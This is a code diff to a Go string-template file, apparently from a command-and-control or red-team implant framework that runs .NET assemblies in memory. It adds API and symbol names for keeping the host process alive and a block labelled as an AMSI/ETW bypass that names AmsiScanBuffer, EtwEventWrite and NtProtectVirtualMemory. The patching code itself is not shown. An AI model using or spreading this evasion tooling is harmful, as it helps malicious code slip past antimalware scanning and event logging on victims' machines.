@@ -6,9 +6,29 @@ package templates
 func GetInlineAssemblyTemplate() *CommandTemplate {
 	tpl := make([]string, MaxTemplateSize)
 
+	// CLR exit prevention strings (100-117) — shared with persistence template
+	tpl[IdxClrDllMscoree] = "mscoree.dll"
+	tpl[IdxClrDllMscorlib] = "mscorlib.dll"
+	tpl[IdxClrDllKernel32] = "kernel32.dll"
+	tpl[IdxClrDllClr] = "clr.dll"
+	tpl[IdxClrDllWinForms] = "System.Windows.Forms.dll"
+	tpl[IdxClrApiGetModuleHandle] = "GetModuleHandleW"
+	tpl[IdxClrApiGetProcAddress] = "GetProcAddress"
+	tpl[IdxClrApiVirtualProtect] = "VirtualProtect"
+	tpl[IdxClrApiExitProcess] = "ExitProcess"
+	tpl[IdxClrApiTerminateProcess] = "TerminateProcess"
+	tpl[IdxClrApiGetCurrentProc] = "GetCurrentProcess"
+	tpl[IdxClrSymSystemNativeExit] = "SystemNative::Exit"
+	tpl[IdxClrSymExitMangled] = "?Exit@SystemNative@@SAXH@Z"
+	tpl[IdxClrKeyEnvExit] = "Environment.Exit"
+	tpl[IdxClrKeyAppExit] = "Application.Exit"
+	tpl[IdxClrKeyProcKill] = "Process.Kill"
+	tpl[IdxClrKeyExitProc] = "ExitProcess"
+	tpl[IdxClrKeyTermProc] = "TerminateProcess"
+
 	// CLR strings (400-404)
-	tpl[IdxIAClrV4] = "v4"
-	tpl[IdxIAClrV2] = "v2"
+	tpl[IdxIAClrV4] = "v4.0.30319"
+	tpl[IdxIAClrV2] = "v2.0.50727"
 	tpl[IdxIAClrV2Full] = "v2.0.50727"
 	tpl[IdxIATempPrefix] = "clr_output_"
 	tpl[IdxIATempSuffix] = ".txt"
@@ -114,6 +134,13 @@ func GetInlineAssemblyTemplate() *CommandTemplate {
 	tpl[IdxIAFmtExecDone] = "\n[+] Execution completed (exit code: %d)\n"
 	tpl[IdxIAFmtAsyncStarted] = "Async inline assembly execution started (Job ID: %s)\n"
 	tpl[IdxIAFmtOutputHint] = "Use 'inline-assembly-output %s' to retrieve output"
+	tpl[IdxIAMethodSigNoArgs] = "Void Main()"
+
+	// Patches strings (1010-1013) — AMSI/ETW bypass (shared with BOF template)
+	tpl[IdxPatchAmsiDll] = "amsi.dll"
+	tpl[IdxPatchAmsiScanBuffer] = "AmsiScanBuffer"
+	tpl[IdxPatchEtwEventWrite] = "EtwEventWrite"
+	tpl[IdxPatchNtProtectVirtMem] = "NtProtectVirtualMemory"
 
 	return &CommandTemplate{
 		Version:   2,
